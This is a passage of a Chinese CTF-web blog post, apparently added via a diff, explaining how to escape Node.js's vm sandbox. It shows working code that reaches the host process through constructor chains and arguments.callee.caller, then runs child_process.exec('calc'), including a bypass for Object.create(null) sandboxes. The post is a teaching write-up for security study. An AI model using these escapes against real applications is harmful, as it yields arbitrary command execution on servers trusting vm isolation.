+<p>所以上面的toString和constructor都是Object.prototype上的属性，所以这两种写法都可以。</p>
+<p>构造器链的尽头是<code>Function</code>，Function的构造器是Function本身，所以利用原型链调用Function的构造函数之后就能获得process对象。</p>
+</blockquote>
+<p>所以只要是this是外部的引用都是可以来进行逃逸的，所以下面这样写也是可以的</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> sandbox = &#123;<br>    <span class="hljs-attr">x</span>: []<br>&#125;;<br><br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">&#x27;x.constructor.constructor(&quot;return process&quot;)()&#x27;</span>,sandbox);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>但是如果x是是数字、字符串等primitive类型就无法逃逸出来，因为他们在传参的时候将数值传递过去，而不是引用属性，无法进一步调用<code>constructor</code></p>
+</blockquote>
+</li>
+<li><p><strong>runInNewContext</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> code = <span class="hljs-string">&#x27;this.constructor.constructor(&quot;return process&quot;)();&#x27;</span>;<br><br><span class="hljs-keyword">const</span> res=vm.<span class="hljs-title function_">runInNewContext</span>(code);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+<p>原理和上面的runInContext一样。</p>
+</li>
+</ul>
+<h2><span id="vm-rao-guo-object-create-null">vm绕过Object.create(null)</span><a href="#vm-rao-guo-object-create-null" class="header-anchor">#</a></h2><p>当我们的sandbox沙箱对象设置为null时，就无法通过this.construtor来获取Function的构造函数</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><br><span class="hljs-keyword">const</span> code = <span class="hljs-string">&quot;this.constructor.constructor(&#x27;return process&#x27;)().env&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(vm.<span class="hljs-title function_">runInContext</span>(code,sandbox));<br></code></pre></td></tr></table></figure>
+
+<p>上面的函数就会报如下错误</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309183122332.png" alt="image-20240309183122332" class="lazyload"></p>
+<p>绕过一种方法就是利用<strong>arguments.callee.caller</strong></p>
+<p>这里了解一下arguments是什么</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">arguments 是一个类数组对象，它包含了传递给当前函数的所有参数。<br><br>arguments.callee 是 arguments 对象的一个属性，它表示当前正在执行的函数本身。<br><br>arguments.callee.caller 是 arguments.callee 对象的一个属性，它表示调用当前正在执行的函数的那个函数，也就是调用当前函数的外部函数。<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title function_">foo</span>();<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">baz</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title function_">bar</span>();<br>&#125;<br><span class="hljs-title function_">foo</span>();<br><span class="hljs-title function_">bar</span>();<br><span class="hljs-title function_">baz</span>();<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309183741062.png" alt="image-20240309183741062" class="lazyload"></p>
+<p>那思路就是在沙箱内定义一个函数，在沙箱外调用这个函数，那么这个函数的arguments.callee.caller则会返回沙箱外的一个对象，那么我们我们就可以在沙箱内进行逃逸了</p>
+<p>那么下面的写法就可以进行绕过：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> func =<br>    <span class="hljs-string">`(() =&gt; &#123;</span><br><span class="hljs-string">    const a = &#123;&#125;</span><br><span class="hljs-string">    a.toString = function () &#123;</span><br><span class="hljs-string">      const cc = arguments.callee.caller;</span><br><span class="hljs-string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">      return p.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;).toString()</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    return a</span><br><span class="hljs-string">  &#125;)()`</span>;<br><br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(func, context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&quot;</span> + res);<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>说一下大概流程：</p>
+<p>这里在沙箱内定义了一个函数将toString()进行了重写，我们在vm.runInContext(func, context)这里执行了该函数重写toString后返回了沙箱内的a对象，然后console.log的时候默认执行了toString()方法，这个时候cc获得的就是外部执行对象，然后我们就成功进行了逃逸。</p>
+<p>这里也可以自己去调试一下会更加清晰。</p>
+</blockquote>
+<p>如果无法重写或触发toString()方法，还可以利用<strong>Proxy</strong>来劫持属性</p>
+
+	</article>
+
+	 
+    <div class="kira-post-copyright">
+        <strong>Author：</strong>clown<br>
+        <strong>Link：</strong><a href="https://clowsman.github.io/2024/03/09/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="https:&#x2F;&#x2F;clowsman.github.io&#x2F;2024&#x2F;03&#x2F;09&#x2F;vm2沙箱逃逸&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;clowsman.github.io&#x2F;2024&#x2F;03&#x2F;09&#x2F;vm2沙箱逃逸&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+  
+	<div class="kira-post-nav">
+		<nav class="post-nav">
+			                          
+			<!-- 先找到与当前文字相同的目录 -->
+			   
+			<!-- 在找到当前文章所在的 index -->
+			                  
+		</nav>
+	</div>
+	
+	<div class="kira-post-meta kira-rainbow">
+		
+			<a class="kirafont icon-container-fill -link" href="/categories/ctf-web/">ctf web</a>
+		
+		
+			<a class="kirafont icon-tag-fill -none-link" href="/tags/web-ctf-nodejs/" rel="tag">web ctf nodejs</a>
+		
+	</div>
+	
+		<script src="/js/kira-code-copy.js"></script>
+	
+	
+	<div class="kira-post-footer">
+		
+
+		
+	<div class="giscus"></div>
+  
+    <script src="https://giscus.app/client.js"
+      data-repo="ch1ny/ch1ny.github.io"
+      data-repo-id="R_kgDOHGgizw"
+      data-category="General"
+      data-category-id="DIC_kwDOHGgiz84CU88t"
+      data-mapping="pathname"
+      data-strict="0"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="top"
+      data-theme="light"
+      data-lang="en"
+      data-loading="lazy"
+      crossorigin="anonymous"
+      async  
+    ></script>
+  
+
+	</div>
+	
+</div>
+
+				</div>
+			</div>
+			<div class="kira-right-column">
+	<a onclick="document.querySelector('#kira-top-header').scrollIntoView({behavior: 'smooth'});" class="kira-backtotop" aria-label="回到顶部" title="回到顶部">
+		<button class="mdui-fab mdui-ripple">
+			<i class="kirafont icon-caret-up"></i>
+		</button>
+	</a>
+</div>
+
+		</div>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
